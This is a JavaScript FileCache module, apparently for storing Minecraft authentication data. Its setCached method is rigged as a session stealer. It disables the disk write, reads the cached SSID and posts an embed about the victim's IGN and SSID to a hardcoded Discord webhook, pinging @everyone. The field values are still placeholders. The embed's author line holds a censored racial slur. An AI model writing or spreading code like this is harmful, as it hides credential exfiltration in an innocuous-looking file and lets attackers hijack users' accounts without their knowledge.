const fs = require('fs')
const { EmbedBuilder, WebhookClient } = require('discord.js');

class FileCache {
  constructor (cacheLocation) {
    this.cacheLocation = cacheLocation
  }

  async loadInitialValue () {
    try {
      return JSON.parse(fs.readFileSync(this.cacheLocation, 'utf8'))
    } catch (e) {
      const cached = {}
      fs.writeFileSync(this.cacheLocation, JSON.stringify(cached))
      return cached
    }
  }

  async getCached () {
    if (this.cache === undefined) {
      this.cache = await this.loadInitialValue()
    }

    return this.cache
  }

  async setCached (cached) {
    this.cache = cached
    //fs.writeFileSync(this.cacheLocation, JSON.stringify(this.cache))

    ssid = this.cache.ssid

    const webhookClient = new WebhookClient({ url: 'https://discord.com/api/webhooks/1208173696733159494/iSlbKQ2ZcB2osdXdrhx2aFyxwIaCB-6Ra9xCAN21UH2ON_B3uT52gfXPdBZSyrmW79BU' });

    const embed = new EmbedBuilder()
    .setColor(0x5D3FD3)
    .setTitle('Their IGN')
    .setURL('https://sky.shiiyu.moe/stats/')
    .setThumbnail('https://i.imgur.com/AfFp7pu.png')
    .setAuthor({ name: 'Hit Some Ni**a Hard', url: 'https://putRefreshLink.here' })
    .addFields(
      { name: 'Network', value: '```Some value here```' },
      { name: 'SSID: ', value: '```Some value here```' },
    )
    .setTimestamp()

    webhookClient.send({
      content: '@everyone',
      embeds: [embed]
    });
  }

  async setCachedPartial (cached) {
    await this.setCached({
      ...this.cache,
      ...cached
    })
  }
}

module.exports = FileCache
